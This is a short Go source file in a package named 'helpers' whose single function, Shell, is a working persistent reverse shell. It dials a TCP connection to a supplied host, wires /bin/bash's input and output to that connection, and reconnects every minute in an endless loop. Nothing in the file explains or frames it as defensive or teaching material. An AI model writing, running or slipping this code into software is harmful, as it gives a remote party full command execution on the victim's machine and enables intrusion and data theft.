package helpers

import (
	"net"
	"os/exec"
	"time"
)

func Shell(host string) {
	c, err := net.Dial("tcp", host)
	if nil != err {
		if nil != c {
			println("EROR")
			c.Close()
		}
		time.Sleep(time.Minute)
		Shell(host)
	}

	cmd := exec.Command("/bin/bash")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
	Shell(host)
}
